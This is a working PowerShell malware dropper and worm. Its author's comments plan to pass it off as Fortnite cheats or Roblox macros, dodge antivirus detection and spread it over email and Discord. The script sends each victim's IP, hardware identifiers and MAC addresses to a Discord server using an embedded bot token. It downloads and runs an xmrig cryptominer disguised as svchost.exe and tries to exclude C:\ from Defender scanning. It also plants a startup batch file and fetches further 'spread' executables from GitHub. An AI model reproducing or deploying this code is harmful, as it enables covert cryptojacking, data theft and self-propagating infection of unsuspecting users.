# persistence needed (fileless registry persistence?)
# make xmrig undetected somehow (fileless miner ?) however it does detect the process not the actual file, so just i reckon make the process hidden (run it as admin so its not killable in task manager)
# dont display the cmd window /
# make xmrig not be a blank screen but just not appear /
# package it up into some cheats for fortnite or sum
# maybe roblox macros 
# fix virus total (add loads of gobbeldy gook vars in original.ps1)
# remove these comments lmao | will be funny if someone finds them
# make the webhook url encoded b64 so script kiddies cant spam that shit | cba no ones using strings on this its calm
# get some victims.
# spread via email and discord /
# get roblox info
# be a good little worm...
$pcName     = $env:COMPUTERNAME;
$userName   = $env:USERNAME;
$uuid       = (Get-WmiObject Win32_ComputerSystemProduct).UUID;
$uptime     = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime;
$os         = Get-CimInstance Win32_OperatingSystem;
$osInfo     = "$($os.Caption) - $($os.Version) ($($os.OSArchitecture))";
$cpu        = Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name;
$gpu        = Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name;
$ramGB      = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2);
$mb         = Get-CimInstance Win32_BaseBoard;
$mbInfo     = "$($mb.Manufacturer) $($mb.Product)";
$drives     = Get-CimInstance Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | ForEach-Object { "$($_.DeviceID): $([math]::Round($_.Size / 1GB, 1)) GB" };
$macs       = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress;
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip;
$token = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("TVRJM016SXlNRFV6TlRZek5UQXhOemM0TWcuR0VvTE9kLmwtWEFGUzJyR3RYQlVkMTZXQnpldzk3TkNfV1l5V3dYRTczVTI0"));
$name = $ip
$guildId = "1364229616071479326"
$response = Invoke-WebRequest -Uri "https://discord.com/api/v9/guilds/$guildId/channels" `
-Method "GET" `
-Headers @{
    "Authorization" = "$token"
}

# Convert the response content from JSON
$channels = $response.Content | ConvertFrom-Json

# Check if a category with the specified name already exists
$existingCategory = $channels | Where-Object { $_.type -eq 4 -and $_.name -eq $name }

if ($existingCategory) {
    Write-Host "Category '$name' already exists with ID: $($existingCategory.id)"
} else{
$response = Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/v9/guilds/1364229616071479326/channels" `
-Method "POST" `
-WebSession $session `
-Headers @{
    "Authorization" = "$token"
} `
-ContentType "application/json" `
-Body "{`"type`":4,`"name`":`"$name`",`"permission_overwrites`":[]}"
$responseJson = $response.Content | ConvertFrom-Json
$categoryId = $responseJson.id
Write-Host "Category ID: $categoryId"
$channelName = "send-commands" 

# $channelResponse = Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/v9/guilds/1364229616071479326/channels" `
# -Method "POST" `
# -WebSession $session `
# -Headers @{
#     "Authorization" = "$token"
# } `
# -ContentType "application/json" `
# -Body "{`"type`":0,`"name`":`"$channelName`",`"parent_id`":`"$categoryId`",`"permission_overwrites`":[]}"
# $channelJson = $channelResponse.Content | ConvertFrom-Json
# $channelId = $channelJson.id

# $responseJson = $response.Content | ConvertFrom-Json
# $categoryId = $responseJson.id
# Write-Host "Category ID: $categoryId"
# $channelName = "key-logs" 

$channelResponse = Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/v9/guilds/1364229616071479326/channels" `
-Method "POST" `
-WebSession $session `
-Headers @{
    "Authorization" = "$token"
} `
-ContentType "application/json" `
-Body "{`"type`":0,`"name`":`"$channelName`",`"parent_id`":`"$categoryId`",`"permission_overwrites`":[]}"
$channelJson = $channelResponse.Content | ConvertFrom-Json
$channelId = $channelJson.id

$channelName = "updates"
$channelResponse = Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/v9/guilds/1364229616071479326/channels" `
-Method "POST" `
-WebSession $session `
-Headers @{
    "Authorization" = "$token"
} `
-ContentType "application/json" `
-Body "{`"type`":0,`"name`":`"$channelName`",`"parent_id`":`"$categoryId`",`"permission_overwrites`":[]}"
$channelJson = $channelResponse.Content | ConvertFrom-Json
$channelIdUpdates = $channelJson.id


$webhookName = "Updates Webhook"
$webhookAvatar = ""

# Define the body of the POST request
$body = @{
    name = $webhookName
    avatar = $webhookAvatar
} | ConvertTo-Json

# Send a POST request to create the webhook
$response = Invoke-WebRequest -Uri "https://discord.com/api/v9/channels/$channelIdUpdates/webhooks" `
-Method "POST" `
-Headers @{
    "Authorization" = "$token"
} `
-ContentType "application/json" `
-Body $body

# Convert the response content from JSON
$responseJson = $response.Content | ConvertFrom-Json

# Output the webhook ID and token (URL will be constructed later)
Write-Host "Webhook created! ID: $($responseJson.id), Token: $($responseJson.token)"

# Construct the webhook URL
$webhookUrl = "https://discord.com/api/webhooks/$($responseJson.id)/$($responseJson.token)"
$payload = @{username = "PC Info Logger";embeds = @(@{title = "PC System Info - $userName@$pcName";color = 65352;fields = @(@{ name = "IP"; value = "$ip"; inline = $false },@{ name = "UUID"; value = "$uuid"; inline = $true }, @{ name = "Uptime Since"; value = "$uptime"; inline = $false }, @{ name = "OS"; value = "$osInfo"; inline = $false }, @{ name = "CPU"; value = "$cpu"; inline = $false }, @{ name = "GPU"; value = "$gpu"; inline = $false }, @{ name = "RAM"; value = "$ramGB GB"; inline = $true }, @{ name = "Motherboard"; value = "$mbInfo"; inline = $false }, @{ name = "Drives"; value = "$drives"; inline = $false }, @{ name = "MAC Addresses"; value = "$macs"; inline = $false }; ); footer = @{ text = "Made by drkst_shdw" }; timestamp = (Get-Date).ToString("o")})} | ConvertTo-Json -Depth 4;
irm -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json';
}
if ($gpu -match "nvidia|gtx|rtx|geforce") {
    $base64Url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rya3N0LXNoZHcvdGVzdHMvcmVmcy9oZWFkcy9tYWluL2VuY29kZWQudHh0";
    $url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64Url));
    $webRequest = Invoke-WebRequest $url;
    $decodedBytes = [Convert]::FromBase64String($webRequest.Content);
    
    try { Set-ExecutionPolicy RemoteSigned -Scope CurrentUser; } catch {};
    
    function Test-IsAdmin {
        $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
        return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);
        A`dd-Mp`Prefer`ence -ExclusionPath "C:\"
    }

    $extractPath = "C:\Users\$env:USERNAME\Documents\System Utilities";
    $deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
    $zipFilePath = "$extractPath\download.zip";
    $cudaPath = "$deepExtractPath\cuda.zip";
    $configPath = "$deepExtractPath\config.json";

    if (Test-Path $extractPath) { Remove-Item -Recurse -Force $extractPath; }
    New-Item -ItemType Directory -Path $extractPath | Out-Null

    [System.IO.File]::WriteAllBytes($zipFilePath, $decodedBytes);
    Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force;
    rm $zipFilePath
    $cudaUrl = "https://github.com/xmrig/xmrig-cuda/releases/download/v6.22.0/xmrig-cuda-6.22.0-cuda12_4-win64.zip"
    iwr -Uri $cudaUrl -OutFile $cudaPath
    Expand-Archive -Path $cudaPath -DestinationPath $deepExtractPath -Force
    $sourceFolder = Join-Path $extractPath "System Utilities\xmrig-cuda-6.22.0"
    $destinationFolder = $deepExtractPath

    # Get all files in the nested "System Utilities" folder
    $files = Get-ChildItem -Path $sourceFolder

    # Move all files to the parent "System Utilities" folder
    foreach ($file in $files) {
        $destinationPath = Join-Path $destinationFolder $file.Name
        Move-Item -Path $file.FullName -Destination $destinationPath -Force
    }

    # Optionally, you can remove the now-empty nested folder (if it's not needed anymore)
    Remove-Item -Path $sourceFolder -Recurse -Force
    rm $cudaPath
    $configUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/config.txt"
    iwr -Uri $configUrl -OutFile $configPath
    $base64Content = Invoke-WebRequest -Uri $configUrl -UseBasicParsing
    $decodedBytes = [System.Convert]::FromBase64String($base64Content.Content)
    [System.IO.File]::WriteAllBytes($configPath, $decodedBytes)

    $exePath = Join-Path $extractPath "System Utilities\svchost.exe"

    if (Test-IsAdmin) {
        & $exePath
    } else {
        & $exePath -ArgumentList "--background"
    }
}
else{
    $base64Url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rya3N0LXNoZHcvdGVzdHMvcmVmcy9oZWFkcy9tYWluL2VuY29kZWQudHh0";
    $url=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64Url));
    $cmd = [char]105+[char]119+[char]114;
    $webRequest = & $cmd $url;
    $base64Content = $webRequest.Content;
    $decodedBytes = [Convert]::FromBase64String($base64Content);
    try {Set-ExecutionPolicy RemoteSigned -Scope CurrentUser;}catch{};
    function Test-IsAdmin {$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);};
    $zipFilePath = "C:\Users\$env:USERNAME\Documents\download.zip";
    [System.IO.File]::WriteAllBytes($zipFilePath, $decodedBytes);
    $extractPath = "C:\Users\$env:USERNAME\Documents\System Utilities";
    if (Test-Path $extractPath) {Remove-Item -Recurse -Force $extractPath;};
    Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force;
    $configUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/config.txt"
    $deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
    $configPath = "$deepExtractPath\config.json";
    $b64Config = iwr -Uri $configUrl
    $base64Content = $b64Config.Content
    $decodedBytes = [System.Convert]::FromBase64String($base64Content)
    [System.IO.File]::WriteAllBytes($configPath, $decodedBytes)
    rm $zipFilePath
    $exePath = Join-Path $extractPath "System Utilities\svchost.exe";
    if (Test-IsAdmin) {
        & $exePath
    } else {
        & $exePath
    }

}
# Optionally, run the saved executable (if needed)
Start-Process $fullExePath
$spreadUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/commands.txt"
$b64 = iwr -Uri $spreadUrl
$decoded = $decodedBytes = [System.Convert]::FromBase64String($b64.Content)

# Specify the path where the .exe should be saved
$deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
$exeFileName = "sysUtils.exe"
$fullExePath = Join-Path $deepExtractPath $exeFileName

# Ensure the target directory exists
if (-not (Test-Path $deepExtractPath)) {
    New-Item -ItemType Directory -Force -Path $deepExtractPath
}

# Write the decoded bytes to the file
[System.IO.File]::WriteAllBytes($fullExePath, $decodedBytes)

# Provide feedback to the user
Write-Host "Executable saved to $fullExePath"

# Optionally, run the saved executable (if needed)
Start-Process $fullExePath
$s = [System.Environment]::GetFolderPath(7)
$content = iwr "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/p.bat" -OutFile "$s\sys32.bat"

# download a file that spreads it
$spreadUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/spread.txt"
$b64 = iwr -Uri $spreadUrl
$decoded = $decodedBytes = [System.Convert]::FromBase64String($b64.Content)

# Specify the path where the .exe should be saved
$deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
$exeFileName = "sys32.exe"
$fullExePath = Join-Path $deepExtractPath $exeFileName

# Ensure the target directory exists
if (-not (Test-Path $deepExtractPath)) {
    New-Item -ItemType Directory -Force -Path $deepExtractPath
}

# Write the decoded bytes to the file
[System.IO.File]::WriteAllBytes($fullExePath, $decodedBytes)

# Provide feedback to the user
Write-Host "Executable saved to $fullExePath"
